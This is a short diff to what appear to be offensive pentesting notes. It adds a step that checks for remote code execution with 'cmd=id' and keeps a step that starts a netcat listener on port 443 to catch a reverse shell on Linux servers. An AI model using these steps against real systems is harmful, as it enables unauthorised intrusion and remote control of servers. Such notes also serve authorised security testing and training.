@@ -1,3 +1,6 @@
+CHECK FOR RCE
+  1. run 'cmd=id' to check if you have RCE
+
 FOR LINUX SERVERSE WHEN YOU HAVE RCE.
   1. start listener over non blocked port like 443 == nc -lvnp 443
 
